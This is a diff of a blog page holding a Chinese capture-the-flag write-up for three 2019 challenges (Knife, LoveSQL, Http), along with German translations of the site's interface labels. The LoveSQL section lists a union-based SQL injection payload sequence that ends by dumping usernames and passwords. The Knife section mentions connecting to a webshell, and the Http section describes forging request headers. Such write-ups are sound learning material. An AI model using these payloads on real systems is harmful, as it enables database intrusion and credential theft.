@@ -10,12 +10,12 @@
 <title>2.7 [极客大挑战 2019]Knife&amp;LoveSQL&amp;Http - Da4er&#39;s Blogs</title>
 
 
-    <meta name="description" content="Knife题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。  LoveSQL简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。payload：12345678and 1&#x3D;1 --+and 1&#x3D;2 --+order by 3 --+union select 1,2,3 --+union select 1,database()">
+    <meta name="description" content="Knife题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。    LoveSQL简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。payload： 12345678and 1&#x3D;1 --+and 1&#x3D;2 --+order by 3 --+union select 1,2,3 --+union select 1,databas">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2.7 [极客大挑战 2019]Knife&amp;LoveSQL&amp;Http">
 <meta property="og:url" content="https://da4er.top/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html">
 <meta property="og:site_name" content="Da4er&#39;s Blogs">
-<meta property="og:description" content="Knife题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。  LoveSQL简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。payload：12345678and 1&#x3D;1 --+and 1&#x3D;2 --+order by 3 --+union select 1,2,3 --+union select 1,database()">
+<meta property="og:description" content="Knife题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。    LoveSQL简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。payload： 12345678and 1&#x3D;1 --+and 1&#x3D;2 --+order by 3 --+union select 1,2,3 --+union select 1,databas">
 <meta property="og:image" content="https://da4er.top/images/og_image.png">
 <meta property="article:published_time" content="2020-02-07T14:27:03.000Z">
 <meta property="article:modified_time" content="2020-02-07T14:28:22.098Z">
@@ -120,7 +120,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Suche" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -149,7 +149,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 236 words)
+                    2 minutes lesen (Über 236 Worte)
                 </span>
                 
                 
@@ -162,12 +162,21 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p><strong>题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/1.png" class title="This is an test image"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p><strong>题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。</strong></p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/1.png" class title="This is an test image">
+
 <hr>
-<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><strong>简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure><br>将对应的表名换成题目中的表名即可<br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/2.png" class title="This is an test image"></p>
+<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><strong>简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。</strong><br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure>
+<p>将对应的表名换成题目中的表名即可</p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/2.png" class title="This is an test image">
+
 <hr>
-<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><strong>这道题目主要考察http头部信息的理解和利用。</strong><br><strong>首先查看源码找到Secret.php</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/3.png" class title="This is an test image"><br><strong>接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/4.png" class title="This is an test image"></p>
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><strong>这道题目主要考察http头部信息的理解和利用。</strong><br><strong>首先查看源码找到Secret.php</strong></p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/3.png" class title="This is an test image">
+<p><strong>接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。</strong></p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/4.png" class title="This is an test image">
 
         </div>
         
@@ -189,7 +198,7 @@
 
 <div class="card">
     <div class="card-content">
-        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <h3 class="menu-label has-text-centered">Gefällt Ihnen der Artikel? Unterstützen Sie den Autor mit</h3>
         <div class="buttons is-centered">
             
                 
@@ -294,7 +303,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Kategorien
             </h3>
             <ul class="menu-list">
             <li>
@@ -424,7 +433,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -449,7 +458,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -478,7 +487,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -583,7 +592,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -751,7 +760,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -776,7 +785,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -805,7 +814,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -910,7 +919,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1159,7 +1168,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1183,7 +1192,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1196,10 +1205,10 @@ document.addEventListener('DOMContentLoaded', function () {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Unbenannt)',
             },
             CONTENT_URL: '/content.json',
         };
